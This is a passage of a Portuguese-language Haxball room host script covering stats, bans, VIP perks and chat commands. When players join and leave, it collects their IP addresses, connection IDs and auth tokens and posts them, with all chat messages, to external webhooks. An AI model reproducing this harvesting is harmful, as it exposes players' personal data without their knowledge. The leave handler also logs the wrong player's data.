                playerActionSummaryTeam.push([goal[0], 1, 0, 0]);
            }
            if (goal[1] != null) {
                if (playerActionSummaryTeam.find(a => a[0].id == goal[1].id)) {
                    let index = playerActionSummaryTeam.findIndex(a => a[0].id == goal[1].id);
                    playerActionSummaryTeam[index][2]++;
                } else {
                    playerActionSummaryTeam.push([goal[1], 0, 1, 0]);
                }
            }
        }
    }
    if (goals[indexOtherTeam].length == 0) {
        let playerCS = getGK(team)?.player;
        if (playerCS != null) {
            if (playerActionSummaryTeam.find(a => a[0].id == playerCS.id)) {
                let index = playerActionSummaryTeam.findIndex(a => a[0].id == playerCS.id);
                playerActionSummaryTeam[index][3]++;
            } else {
                playerActionSummaryTeam.push([playerCS, 0, 0, 1]);
            }
        }
    }

    playerActionSummaryTeam.sort((a, b) => (a[1] + a[2] + a[3]) - (b[1] + b[2] + b[3]));
    return playerActionSummaryTeam;
}

/* PRINT FUNCTIONS */

function printPlayerStats(stats) {
    let statsString = '[📄] Stats de ';
    for (let [key, value] of Object.entries(stats)) {
        if (key == 'playerName') statsString += `${value}: `;
        else if (key != 'pontos') {
            let statName = statNameTranslation[key] ? statNameTranslation[key] : key;
            let reCamelCase = /([A-Z](?=[a-z]+)|[A-Z]+(?![a-z]))/g;
            statName = statName.replace(reCamelCase, ' $1').trim();
            statsString += `${statName.charAt(0).toUpperCase() + statName.slice(1)}: ${value}, `;
        }
    }
    statsString = statsString.substring(0, statsString.length - 2);
    return statsString;
}

function printPlayerStatsMe(stats) {
    let statsString = '[📄] Seus stats ';
    for (let [key, value] of Object.entries(stats)) {
        if (key == 'playerName') statsString += `${value}: `;
        else if (key != 'pontos') {
            let statName = statNameTranslation[key] ? statNameTranslation[key] : key;
            let reCamelCase = /([A-Z](?=[a-z]+)|[A-Z]+(?![a-z]))/g;
            statName = statName.replace(reCamelCase, ' $1').trim();
            statsString += `${statName.charAt(0).toUpperCase() + statName.slice(1)}: ${value}, `;
        }
    }
    statsString = statsString.substring(0, statsString.length - 2);
    return statsString;
}

/* FETCH FUNCTIONS */

function fetchGametimeReport(game) {
    var fieldGametimeRed = {
        name: '🔴        **STATUS TIME VERMELHO**',
        value: '⌛ __**Tempo do Jogo:**__\n\n',
        inline: true,
    };
    var fieldGametimeBlue = {
        name: '🔵       **STATUS TIME AZUL**',
        value: '⌛ __**Tempo do Jogo:**__\n\n',
        inline: true,
    };
    var redTeamTimes = game.playerComp[0].map((p) => [p.player, getGametimePlayer(p)]);
    var blueTeamTimes = game.playerComp[1].map((p) => [p.player, getGametimePlayer(p)]);

    for (let time of redTeamTimes) {
        var minutes = getMinutesReport(time[1]);
        var seconds = getSecondsReport(time[1]);
        fieldGametimeRed.value += `> **${time[0].name}:** ${minutes > 0 ? `${minutes}m` : ''}` +
            `${seconds > 0 || minutes == 0 ? `${seconds}s` : ''}\n`;
    }
    fieldGametimeRed.value += `\n${blueTeamTimes.length - redTeamTimes.length > 0 ? '\n'.repeat(blueTeamTimes.length - redTeamTimes.length) : ''
        }`;
    fieldGametimeRed.value += '=====================';

    for (let time of blueTeamTimes) {
        var minutes = getMinutesReport(time[1]);
        var seconds = getSecondsReport(time[1]);
        fieldGametimeBlue.value += `> **${time[0].name}:** ${minutes > 0 ? `${minutes}m` : ''}` +
            `${seconds > 0 || minutes == 0 ? `${seconds}s` : ''}\n`;
    }
    fieldGametimeBlue.value += `\n${redTeamTimes.length - blueTeamTimes.length > 0 ? '\n'.repeat(redTeamTimes.length - blueTeamTimes.length) : ''
        }`;
    fieldGametimeBlue.value += '=====================';

    return [fieldGametimeRed, fieldGametimeBlue];
}

function fetchActionsSummaryReport(game) {
    var fieldReportRed = {
        name: '🔴        **STATUS TIME VERMELHO**',
        value: '📊 __**Status Jogador:**__\n\n',
        inline: true,
    };
    var fieldReportBlue = {
        name: '🔵       **STATUS TIME VERMELHO**',
        value: '📊 __**Status Jogador:**__\n\n',
        inline: true,
    };
    var goals = [[], []];
    for (let i = 0; i < game.goals.length; i++) {
        goals[game.goals[i].team - 1].push([game.goals[i].striker, game.goals[i].assist]);
    }
    var redActions = actionReportCountTeam(goals, Team.RED);
    if (redActions.length > 0) {
        for (let act of redActions) {
            fieldReportRed.value += `> **${act[0].team != Team.RED ? '[OG] ' : ''}${act[0].name}:**` +
                `${act[1] > 0 ? ` ${act[1]}G` : ''}` +
                `${act[2] > 0 ? ` ${act[2]}A` : ''}` +
                `${act[3] > 0 ? ` ${act[3]}CS` : ''}\n`;
        }
    }
    var blueActions = actionReportCountTeam(goals, Team.BLUE);
    if (blueActions.length > 0) {
        for (let act of blueActions) {
            fieldReportBlue.value += `> **${act[0].team != Team.BLUE ? '[OG] ' : ''}${act[0].name}:**` +
                `${act[1] > 0 ? ` ${act[1]}G` : ''}` +
                `${act[2] > 0 ? ` ${act[2]}A` : ''}` +
                `${act[3] > 0 ? ` ${act[3]}CS` : ''}\n`;
        }
    }

    fieldReportRed.value += `\n${blueActions.length - redActions.length > 0 ? '\n'.repeat(blueActions.length - redActions.length) : ''
        }`;
    fieldReportRed.value += '=====================';

    fieldReportBlue.value += `\n${redActions.length - blueActions.length > 0 ? '\n'.repeat(redActions.length - blueActions.length) : ''
        }`;
    fieldReportBlue.value += '=====================';

    return [fieldReportRed, fieldReportBlue];
}

/* EVENTS */

/* PLAYER MOVEMENT */

function adicionarJogador(nome, id, conn, auth, ipv4) {
    jogadoresRoom.push({
        nome: nome,
        id: id,
        conn: conn,
        auth: auth,
        ipv4: ipv4
    });
}

function getIPv4DoJogador(nomeJogador) {
    for (var i = 0; i < jogadoresRoom.length; i++) {
        if (jogadoresRoom[i].nome === nomeJogador) {
            return jogadoresRoom[i].ipv4;
        }
    }
    return null; // Retorna null se o jogador não for encontrado
}

function getJogadorPeloNome(nomeJogador) {
    for (var i = 0; i < jogadoresRoom.length; i++) {
        if (jogadoresRoom[i].nome === nomeJogador) {
            return jogadoresRoom[i];
        }
    }
    return null;
}

function getJogadorConnPorNome(nomeJogador) {
    for (var i = 0; i < jogadoresRoom.length; i++) {
        if (jogadoresRoom[i].nome === nomeJogador) {
            return jogadoresRoom[i].conn;
        }
    }
    return null;
}

function getJogadorAuthPorNome(nomeJogador) {
    for (var i = 0; i < jogadoresRoom.length; i++) {
        if (jogadoresRoom[i].nome === nomeJogador) {
            return jogadoresRoom[i].auth;
        }
    }
    return null;
}

function removerJogadorPorNome(nomeJogador) {
    for (var i = 0; i < jogadoresRoom.length; i++) {
        if (jogadoresRoom[i].nome === nomeJogador) {
            jogadoresRoom.splice(i, 1);
            return true;
        }
    }
    return false;
}

room.onPlayerJoin = async function (player) {
    var ipv4 = await getIP(player);

    playerConnections.set(player.id, player.conn);
    playerAuth.set(player.id, player.auth);
    playerIpv4.set(player.id, ipv4);

    var conn = playerConnections.get(player.id);
    var auth = playerAuth.get(player.id);
    var ipv4 = playerIpv4.get(player.id);
    var entrada = new Date().toString();


    buscarBanimentoPorIpv4(ipv4).then((banimentos) => {
        if (banimentos.length > 0) {
            var banimento = banimentos[0];
            room.kickPlayer(player.id, `Você está banido. Motivo: ${banimento.motivo}. Discord para contato: ${discord}`, false);
        }
    });

    buscarBanimentoPorAuth(auth).then((banimentos) => {
        if (banimentos.length > 0) {
            var banimento = banimentos[0];
            room.kickPlayer(player.id, `Você está banido. Motivo: ${banimento.motivo}. Discord para contato: ${discord}`, false);
        }
    });

    buscarBanimentoPorConn(conn).then((banimentos) => {
        if (banimentos.length > 0) {
            var banimento = banimentos[0];
            room.kickPlayer(player.id, `Você está banido. Motivo: ${banimento.motivo}. Discord para contato: ${discord}`, false);
        }
    });

    buscarBanimentoPorNomeOuId(player.name).then((banimentos) => {
        if (banimentos.length > 0) {
            var banimento = banimentos[0];
            room.kickPlayer(player.id, `Você está banido. Motivo: ${banimento.motivo}. Discord para contato: ${discord}`, false);
        }
    });

    buscarBanimentoPorNomeOuId(player.id).then((banimentos) => {
        if (banimentos.length > 0) {
            var banimento = banimentos[0];
            room.kickPlayer(player.id, `Você está banido. Motivo: ${banimento.motivo}. Discord para contato: ${discord}`, false);
        }
    });

    // Pré-registro
    setTimeout(() => {
        var infoUser = `Pré-registro de entrada:\n\n> - Nome: ${player.name}\n> - ID: ${player.id}\n> - Auth: ${auth}\n> - Conn: ${conn}\n> - Ipv4: ${ipv4}\n> - Entrada: ${entrada}`;

        if (!Array.isArray(subAccounts)) {
            subAccounts = [];
        }

        if (account2[player.name]) return;

        account2[player.name] = {
            id: player.id,
            nome: player.name,
            auth: auth,
            conn: conn,
            ipv4: ipv4,
            entrada: entrada
        };

        subAccounts.splice(0, subAccounts.length);
        subAccounts.push(account2);
        localStorage.setItem("subaccounts", JSON.stringify(subAccounts));

        if (urls.preRegistro && urls.preRegistro !== "") {
            fetch(urls.preRegistro, {
                method: 'POST',
                body: JSON.stringify({
                    content: infoUser,
                    username: roomName,
                }),
                headers: {
                    'Content-Type': 'application/json',
                },
            }).then((res) => res);
        }
    }, 3000);

    userConn = player.conn;
    userAuth = player.auth;
    userIp = ipv4;

    if (messageBlocks[player.name] == undefined) {
        messageBlocks[player.name] = { name: player.name, blocking: [] };
    }

    if (!astros[player.name]) {
        astros[player.name] = 0
        astrosstorage.splice(0, astrosstorage.length);
        astrosstorage.push(astros);
        localStorage.setItem("astros", JSON.stringify(astrosstorage));

    }

    var msgEntrada = "```" + "📝 Informações do jogador ⏰" + "\n" +

        "🚀" + `${roomName}` + "🚀" + "\n" +
        "✨ Nick: " + player.name + "\n" +
        "💥 ID: " + player.id + "\n" +
        "🌐 Conn: " + player.conn + "\n" +
        "💻 Auth: " + player.auth + "\n" +
        "🌏 Ipv4 " + (ipv4) + "\n" +
        "⏰ Data: " + `${getCurrentDatetime()}` + "```";

    if (urls.entradas != '') {
        fetch(urls.entradas, {
            method: 'POST',
            body: JSON.stringify({
                content: `${player.name} Entrou na ${roomName}, informações: \n\n` + msgEntrada,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }

    var jogador = {
        nome: player.name,
        id: player.id,
        conn: player.conn,
        auth: player.auth,
        ipv4: ipv4
    };

    adicionarJogador(jogador.nome, jogador.id, jogador.conn, jogador.auth, jogador.ipv4);

    localStorage.setItem("jogadoresRoom", JSON.stringify(jogador));

    var ipBanned = ipv4;
    var connDoJogador = userConn;
    var authDoJogador = userAuth;
    var nomeDoJogador2 = player.name;

    var isBanned = banList.some(user => {
        return (
            user.ipv4 === ipBanned ||
            user.conn === connDoJogador ||
            user.auth === authDoJogador ||
            user.nome === nomeDoJogador2
        );
    });

    var isIpBanned = ipbanido.some(ip => {
        return ip.ipv4 === ipBanned;
    });

    var isConnBanned = connbanida.some(conection => {
        return conection.conn === connDoJogador;
    });

    var isAuthBanned = authbanida.some(conection => {
        return conection.auth === authDoJogador;
    });

    if (isBanned || isIpBanned || isConnBanned || isAuthBanned) {
        room.kickPlayer(player.id, `Você está banido(a). Consulte o motivo no nosso Discord: ${discord}`, false);
        return false;
    }

    if (room.getPlayerList().length <= 7) {
        defaultSlowMode = 1.5
    } else if (room.getPlayerList().length < 15) {
        defaultSlowMode = (0.2 * room.getPlayerList().length).toFixed(1)
    } else {
        defaultSlowMode = 3.0
    }

    authArray[player.id] = player.auth;
    connautologin = player.conn;
    authautologin = player.auth;

    room.sendAnnouncement(
        `Seja bem-vindo(a),➺ ${player.name}! Divirta-se\n Digite !ajuda para ver os comandos!`,
        player.id,
        welcomeColor,
        'bold',
        HaxNotification.CHAT
    )

    updateTeams();
    updateAdmins();

    if (masterList.findIndex((auth) => auth == player.auth) != -1) {
        room.sendAnnouncement(`O Fundador ${player.name} conectou-se à sala!`, null, announcementColor, 'bold', HaxNotification.CHAT)
        room.setPlayerAdmin(player.id, true);
    } else if (donoList.findIndex((auth) => auth == player.auth) != -1) {
        room.sendAnnouncement(`O Dono ${player.name} conectou-se à sala!`, null, announcementColor, 'bold', HaxNotification.CHAT)
        room.setPlayerAdmin(player.id, true);
    } else if (diretores.findIndex((auth) => auth == player.auth) != -1) {
        room.sendAnnouncement(`O Diretor ${player.name} conectou-se à sala!`, null, announcementColor, 'bold', HaxNotification.CHAT)
        room.setPlayerAdmin(player.id, true);
    } else if (gerentes.findIndex((auth) => auth == player.auth) != -1) {
        room.sendAnnouncement(`O Gerente ${player.name} conectou-se à sala!`,
            null, announcementColor, 'bold', HaxNotification.CHAT)
        room.setPlayerAdmin(player.id, true);
    } else if (adminList.findIndex((auth) => auth == player.auth) != -1) {
        room.sendAnnouncement(`O Administrador ${player.name} conectou-se à sala!`,
            null, announcementColor, 'bold', HaxNotification.CHAT)
        room.setPlayerAdmin(player.id, true);
    } else if (mods.findIndex((auth) => auth == player.auth) != -1) {
        room.sendAnnouncement(`O Moderador ${player.name} conectou-se à sala!`,
            null, announcementColor, 'bold', HaxNotification.CHAT)
        room.setPlayerAdmin(player.id, true);
    } else if (vips[player.auth]) {
        if (vips[player.auth].msgEntrada != '') {
            room.sendAnnouncement(`${vips[player.auth].msgEntrada}`,
                null, announcementColor, 'bold', HaxNotification.CHAT)
        }
    }

    var sameAuthCheck = playersAll.filter((p) => p.id != player.id && authArray[p.id] == player.auth);
    if (sameAuthCheck.length > 0 && !debugMode) {
        var oldPlayerArray = playersAll.filter((p) => p.id != player.id && authArray[p.id] == player.auth);
        for (let oldPlayer of oldPlayerArray) {
            ghostKickHandle(oldPlayer, player);
        }
    }
    handlePlayersJoin()

    auto = false
    if (autologin[player.name]) {

        if (autologin[player.name]['auth'] == player.auth && autologin[player.name]['conn'] == player.conn) {
            auto = true
            confirm.push(player.id)
            room.sendAnnouncement(`Você realizou auto login!!`, player.id, announcementColor, "bold");
        }
        else {
            room.sendAnnouncement(`Falha no autologin, local de acesso não reconhecido, use sua senha!`, player.id, errorColor, "bold");
        }
    }

    if (account[player.name] && auto == false) {
        room.sendAnnouncement(`Existe uma conta com este nick! Faça login em 30 segundos ou será kikado.\n!login [senha] \nSe essa conta não for sua, mude seu nick e volte.`, player.id, 0xFFFFFF, "bold");
        let tempoI = 0
        let interval1 = setInterval(() => {
            tempoI++
            if (confirm.includes(player.id)) {
                clearInterval(interval1)
            } else {
                room.sendAnnouncement(`Faça login em 30 segundos ou será kikado.\nSe essa conta não for sua, mude seu nick e volte.`, player.id, 0xFFFFFF, "bold");
            }
            if (tempoI == 6) {
                room.kickPlayer(player.id, "Faça login na sua conta.", false)
                clearInterval(interval1)
            }
        }, 5 * 1000)
    } else if (!account[player.name]) {
        room.sendAnnouncement("Se registre com o comando: !registrar [senha]", player.id, 0xFFFFFF, "bold")
    }
}

room.onPlayerTeamChange = function (changedPlayer, byPlayer) {
    handleLineupChangeTeamChange(changedPlayer);
    if (AFKSet.has(changedPlayer.id) && changedPlayer.team != Team.SPECTATORS) {
        room.setPlayerTeam(changedPlayer.id, Team.SPECTATORS);
        room.sendAnnouncement(
            `${changedPlayer.name} está AFK!`,
            null,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        return;
    }
    updateTeams();
    if (gameState != State.STOP) {
        if (changedPlayer.team != Team.SPECTATORS && game.scores.time <= (3 / 4) * game.scores.timeLimit && Math.abs(game.scores.blue - game.scores.red) < 2) {
            changedPlayer.team == Team.RED ? teamRedStats.push(changedPlayer) : teamBlueStats.push(changedPlayer);
        }
    }
    handleActivityPlayerTeamChange(changedPlayer);
    handlePlayersTeamChange(byPlayer);
};

room.onPlayerLeave = function (player) {
    var conn = userConn
    var ipv4 = conn.match(/.{1,2}/g).map(function (v) {
        return String.fromCharCode(parseInt(v, 16));
    }).join('');

    var infoUser = `Nick: ${player.name} \nID: ${player.id} \nConn: ${conn} \nAuth: ${userAuth} \nIPV4: ${ipv4} \nData e hora: ${getCurrentDatetime()}`;

    if (urls.saidas != "") {
        fetch(urls.saidas, {
            method: 'POST',
            body: JSON.stringify({
                content: `O ${player.name} saiu da ${roomName}! \n\n\`\`\`${infoUser}\`\`\``,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }

    setTimeout(() => {
        removerJogadorPorNome(player.name);
    }, 10000);

    if (confirm.includes(player.id)) {
        confirm.splice(confirm.indexOf(player.id), 1)
    }
    setTimeout(() => {
        delete authArray[player.id]
        playerConnections.delete(player.id);
        playerAuth.delete(player.id);
        playerIpv4.delete(player.id);
    }, 5 * 1000)
    handleLineupChangeLeave(player);
    checkCaptainLeave(player);
    updateTeams();
    updateAdmins();
    handlePlayersLeave();
};

room.onPlayerKicked = function (kickedPlayer, reason, ban, byPlayer) {
    kickFetchVariable = true;

    if (urls.roomLogChat != '') {
        var stringContent = `||[${getDate()}]|| ⛔ ${ban ? 'BAN' : 'KICK'}\n` +
            `**${kickedPlayer.name}** was ${ban ? 'banned' : 'kicked'}` +
            `${byPlayer != null ? ' by **' + byPlayer.name + '**' : ''}`
        fetch(urls.roomLogChat, {
            method: 'POST',
            body: JSON.stringify({
                content: stringContent,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }


    if ((ban && ((byPlayer != null &&
        (byPlayer.id == kickedPlayer.id || getRole(byPlayer) < Role.ADMIN_PERM)) || getRole(kickedPlayer) == Role.MASTER)) || disableBans
    ) {
        room.clearBan(kickedPlayer.id);
        return;
    }
    if (byPlayer != null && getRole(byPlayer) < Role.ADMIN_PERM) {
        room.sendAnnouncement(
            'Você não tem permissão para expulsar/banir jogadores!',
            byPlayer.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        room.setPlayerAdmin(byPlayer.id, false);
        return;
    }
    if (ban) banList.push([kickedPlayer.name, kickedPlayer.id]);
};

function stopChangeVip(vipTimeoutIdR, vipTimeoutIdB, time) {
    if (vipTimeoutIdR) {
        clearTimeout(vipTimeoutIdR, time);
    }
    if (vipTimeoutIdB) {
        clearTimeout(vipTimeoutIdB, time);
    }
}
/* PLAYER ACTIVITY */

room.onPlayerChat = function (player, message) {
    if (!message.startsWith('!')) {
        fetch(urls.roomLogChat, {
            method: 'POST',
            body: JSON.stringify({
                content: `||[${getDate()}]|| [💬] CHAT \n**${player.name}** : ${message.replace('@', '@ ')}`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }

    if (message.match(regex)) {
        var userId = player.id;
        var motivo = `Racismo / Palavras inapropriadas. Discord para contato: ${discord}`;
        var admin = '[🤖] Host';
        const tempoFinal = calcularTempoFinal("999d");
        const mensagemFormatada = formatarMensagem(tempoFinal);

        console.log(tempoFinal);

        var connDoJogador = playerConnections.get(player.id);
        var authDoJogador = playerAuth.get(player.id);
        var userIpv4 = playerIpv4.get(player.id);

        const banimento = {
            id: player.id,
            nome: player.name,
            auth: authDoJogador,
            conn: connDoJogador,
            ipv4: userIpv4,
            motivo: motivo,
            admin: admin,
            tempoInicial: new Date(),
            tempoFinal: tempoFinal
        };

        var getUserRoom = room.getPlayerList().filter((p) => p.id == player.id);
        if (getUserRoom) room.kickPlayer(player.id, motivo, false)

        addBanimento(banimento).then(() => {
            room.sendAnnouncement(`[🚧] Jogador ${player.name} banido por Racismo!`, null, 0xF1F1F1, "bold", 2);
            room.sendAnnouncement(`[🚧] ${mensagemFormatada}`, null, 0xF1F1F1, "bold", 2);

            if (urls.autoBan && urls.autoBan != "") {
                fetch(urls.autoBan, {
                    method: 'POST',
                    body: JSON.stringify({
                        content: `[🚧] Jogador ${player.name} banido por Racismo!\n-${mensagemFormatada}\n- Mensagem: ${message}`,
                        username: roomName,
                    }),
                    headers: {
                        'Content-Type': 'application/json',
                    },
                }).then((res) => res);
            }
        }).catch((error) => {
            console.error(error);
        });

        return false;
    }

    var players = room.getPlayerList();
    var recipients = players.filter(p => messageBlocks[p.name].blocking.includes(player.id) == false);
    var command = message.toLowerCase().split(" ")[0];
    var p2;

    if (ignoreCommands.includes(command) == true) {
        var index = ignoreCommands.indexOf(command);
        var ID = parseInt(message.toLowerCase().split(" ")[1]);
        var p = players.find(x => x.id == ID);

        if (p) {
            if (p.id == player.id) {
                room.sendAnnouncement(`${ignoreMessageSets[index][0]} (ID: ${ID})`, player.id, colors2[0], fonts[0], sounds[0]);
                return false;
            }
            else {
                if (messageBlocks[player.name].blocking.includes(p.id) == false) {
                    if (index == 0) {
                        messageBlocks[player.name].blocking.push(p.id);
                        room.sendAnnouncement(`${p.name}${ignoreMessageSets[index][1]} (ID: ${ID})`, player.id, colors2[1], fonts[1], sounds[1]);
                        return false;
                    }
                    else if (index == 1) {
                        room.sendAnnouncement(`${ignoreMessageSets[index][2]} (ID: ${ID})`, player.id, colors2[2], fonts[2], sounds[2]);
                        return false;
                    }
                    else {
                        console.log("Error");
                        return false;
                    }
                }
                else {
                    if (index == 0) {
                        room.sendAnnouncement(`${ignoreMessageSets[index][2]} (ID: ${ID})`, player.id, colors2[2], fonts[2], sounds[2]);
                        return false;
                    } else if (index == 1) {
                        var i = messageBlocks[player.name].blocking.indexOf(p.id);
                        messageBlocks[player.name].blocking.splice(i, 1);
                        room.sendAnnouncement(`${p.name}${ignoreMessageSets[index][1]} (ID: ${ID})`, player.id, colors2[1], fonts[1], sounds[1]);
                        return false;
                    } else {
                        console.log("Error");
                        return false;
                    }
                }
            }
        } else {
            room.sendAnnouncement(`${ignoreMessageSets[index][3]} (ID: ${ID})`, player.id, colors2[3], fonts[3], sounds[3]);
            return false;
        }
    }

    // CHAT ADMIN
    if (player.admin || mods.includes(authArray[player.id]) || adminList.includes(authArray[player.id]) || gerentes.includes(authArray[player.id]) || diretores.includes(authArray[player.id]) || donoList.includes(authArray[player.id]) || masterList.includes(authArray[player.id])) {

        if (message.startsWith(chatAdmCommand)) {
            var players = room.getPlayerList();

            for (var i = 0; i < players.length; i++) {
                var adminPlayer = players[i];

                if (adminPlayer.admin) {
                    room.sendAnnouncement(` [🚧] [CHAT ADMIN] ${player.name}: ${message.slice(chatAdmCommand.length)}`, adminPlayer.id, cores.ciano, 'bold', 2);
                }
            }

            return false;
        }
    }

    var rankTag = tagInicialRank, vipTag = "", corChat = "", pausarJogoOFF = false, furarFila = false, msgArray = message.split(/ +/), fonte = ""
    tipoVip = 0

    if (gameState !== State.STOP && player.team != Team.SPECTATORS) {
        let pComp = getPlayerComp(player);
        if (pComp != null) pComp.inactivityTicks = 0;
    }

    if (chooseMode && teamRed.length * teamBlue.length != 0) {
        var choosingMessageCheck = chooseModeFunction(player, message);
        if (choosingMessageCheck) return false;
    }

    if (vips[authArray[player.id]]) {
        tipoVip = vips[authArray[player.id]].tipoVip
        corChat = vips[authArray[player.id]].corChat
        pausarJogoOFF = vips[authArray[player.id]].pausarJogoOFF
        furarFila = vips[authArray[player.id]].furarFila
        if (vips[authArray[player.id]].fonte != 0) {
            //"normal","bold","italic", "small", "small-bold", "small-italic"
            //"normal","negrito","itálico", "pequeno", "pequeno negrito", "pequeno itálico"
            if (vips[authArray[player.id]].fonte == 1) {
                fonte = "normal"
            } else if (vips[authArray[player.id]].fonte == 2) {
                fonte = "bold"
            } else if (vips[authArray[player.id]].fonte == 3) {
                fonte = "italic"
            } else if (vips[authArray[player.id]].fonte == 4) {
                fonte = "small"
            } else if (vips[authArray[player.id]].fonte == 5) {
                fonte = "small-bold"
            } else if (vips[authArray[player.id]].fonte == 6) {
                fonte = "small-italic"
            }
        }
    }

    if (slowMode > 0) {
        var filter = slowModeFunction(player, message);
        if (filter) {
            if (tipoVip >= 2) {
                room.sendAnnouncement(`Você está digitando rápido demais. Aguarde... 1.5s.`,
                    player.id, infoColor, 'bold', HaxNotification.CHAT)
                return false
            }
            room.sendAnnouncement(`Você está digitando rápido demais. Aguarde... ${defaultSlowMode}s.`,
                player.id, infoColor, 'bold', HaxNotification.CHAT)
            return false
        }
    }

    if (player.admin && msgArray[0] == '!sorteio') {
        room.sendAnnouncement(`O admin ${player.name} iniciou o sorteio!\n\nO Ganhandor foi... ${room.getPlayerList()[Math.floor(Math.random() * room.getPlayerList().length)].name}\nParabéns seu prêmio será entregue pelo adm, aguarde....`,
            null, infoColor, 'bold', HaxNotification.CHAT)
        return false
    }

    if (player.team == 1) {
        if (teamRed[0].id == player.id) {
            updateTeams()
            capitão = player.id
        }
    }
    if (player.team == 2) {
        if (teamBlue[0].id == player.id) {
            updateTeams()
            capitão = player.id
        }
    }

    var stats2 = new HaxStatistics(player.name);
    if (localStorage.getItem(authArray[player.id])) {
        stats2 = JSON.parse(localStorage.getItem(authArray[player.id]));
    }

    if (tipoVip != 0) {
        if (tipoVip == 1) {
            vipTag = ` [${vipNames[1]}] `
        } else if (tipoVip == 2) {
            vipTag = ` [${vipNames[2]}] `
        } else if (tipoVip == 3) {
            vipTag = ` [${vipNames[3]}] `
        } else if (tipoVip == 4) {
            vipTag = ` [${vipNames[4]}] `
        }
    }

    if (modoVoteBan && message == '!s') {
        if (votouBan.includes(player.id)) {
            room.sendAnnouncement(`Tu já votou!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false
        }
        votosBan++
        votouBan.push(player.id)
        room.sendAnnouncement(`${player.id} votou!`,
            null, announcementColor, 'bold', HaxNotification.CHAT)
        return false
    }
    if (modoVoteMute && message == '!s') {
        if (votouMute.includes(player.id)) {
            room.sendAnnouncement(`Tu já votou!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false
        }
        votosMute++
        votouMute.push(player.id)
        room.sendAnnouncement(`${player.id} votou!`,
            null, announcementColor, 'bold', HaxNotification.CHAT)
        return false
    }

    if (msgArray[0].substring(0, 7).toLowerCase() == '!avatar' && tipoVip > 1) {
        if (!msgArray[1]) {
            room.sendAnnouncement(`Tu precisa informar qual avatar vai ser alterado! Exemplo:\n!avatar <1> <avatar> (para quando faz gol) ou !avatar <2> <avatar> (para quando toma gol)`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false
        }
        if (msgArray[1] >= 1 && msgArray[1] <= 2) {
            if (!msgArray[2]) {
                room.sendAnnouncement(`Tu precisa informar o texto ou emoji do avatar! Exemplo:\n!avatar 1 🙂`,
                    player.id, errorColor, 'bold', HaxNotification.CHAT)
                return false
            }
            vips[authArray[player.id]].avatarGol[msgArray[1] - 1] = msgArray[2]
            room.sendAnnouncement(`Avatar ${msgArray[1]} modificado com sucesso!`,
                player.id, defaultColor, 'bold', HaxNotification.CHAT)
            return false
        } else {
            room.sendAnnouncement(`Tu só pode modificar o avatar 1 (para quando faz gol) ou 2 (para quando toma gol)!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false
        }
    }

    if (capitão == player.id) {
        if (uniList[msgArray[0].toLowerCase()] != undefined) {
            if (vipTimeoutIdR || vipTimeoutIdB) {
                if (player.team == 1) {
                    stopChangeVip(vipTimeoutIdR, 1);
                } else if (player.team == 2) {
                    stopChangeVip(vipTimeoutIdB, 2);
                }
            }
            room.setTeamColors(player.team, ...uniList[msgArray[0].toLowerCase()])
            return false
        }
    }

    function changeVipValue(vip, time) {
        if (time == 1) {
            currentVipValue = (currentVipValue % 3) + 1; // Alternar entre 1, 2 e 3
            room.setTeamColors(1, ...uniVIP2[vip][currentVipValue]);

            vipTimeoutIdR = setTimeout(function () { changeVipValue(vip, time); }, 10);
        } else if (time == 2) {
            currentVipValue = (currentVipValue % 3) + 1; // Alternar entre 1, 2 e 3
            room.setTeamColors(2, ...uniVIP2[vip][currentVipValue]);

            vipTimeoutIdB = setTimeout(function () { changeVipValue(vip, time); }, 10);
        }
    }

    if (capitão == player.id && tipoVip > 0 && vips[authArray[player.id]]) {
        if (uniVIP[msgArray[0].toLowerCase()] != undefined) {
            if (vipTimeoutIdR || vipTimeoutIdB) {
                if (player.team == 1) {
                    stopChangeVip(vipTimeoutIdR, 1);
                } else if (player.team == 2) {
                    stopChangeVip(vipTimeoutIdB, 2);
                }
            }
            room.setTeamColors(player.team, ...uniVIP[msgArray[0].toLowerCase()]);
            return false;
        } else if (uniVIP2[msgArray[0].toLowerCase()] != undefined) {
            if (player.team == 1) {
                // RED
                changeVipValue(msgArray[0].toLowerCase(), 1);
            } else if (player.team == 2) {
                // BLUE
                changeVipValue(msgArray[0].toLowerCase(), 2);
            }

            return false;
        }
    }

    if (msgArray[0].substring(0, 7).toLowerCase() == '!setuni' && tipoVip > 1) {
        if (msgArray[1] >= 1 && msgArray[1] <= 3) {
            if (msgArray[4]) {
                let regEx1 = new RegExp(`^[0-9]{1,3}$`)
                let regEx2 = new RegExp(`^[0-9a-fA-F]{6}$`)
                let xuxa1 = true
                let xuxa2 = true
                if (msgArray[5]) {
                    xuxa1 = regEx2.test(msgArray[5])
                }
                if (msgArray[6]) {
                    xuxa2 = regEx2.test(msgArray[6])
                }
                if (regEx1.test(msgArray[2]) && regEx2.test(msgArray[3]) && regEx2.test(msgArray[4]) && xuxa1 && xuxa2) {
                    if (msgArray[6]) {
                        vips[authArray[player.id]].unis['!uni' + msgArray[1]] = [msgArray[2], '0x' + msgArray[3], ['0x' + msgArray[4], '0x' + msgArray[5], '0x' + msgArray[6]]]
                    } else if (msgArray[5]) {
                        vips[authArray[player.id]].unis['!uni' + msgArray[1]] = [msgArray[2], '0x' + msgArray[3], ['0x' + msgArray[4], '0x' + msgArray[5]]]
                    } else {
                        vips[authArray[player.id]].unis['!uni' + msgArray[1]] = [msgArray[2], '0x' + msgArray[3], ['0x' + msgArray[4]]]
                    }
                    room.sendAnnouncement(`Uniforme criado/modificado com sucesso! Use o comando !uni${msgArray[1]} para usar!`,
                        player.id, defaultColor, 'bold', HaxNotification.CHAT)
                    return false
                } else {
                    room.sendAnnouncement(`Código de uniforme inválido!`,
                        player.id, errorColor, 'bold', HaxNotification.CHAT)
                    return false
                }
            } else {
                room.sendAnnouncement(`Número de argumentos minimos para o comando inválido!`,
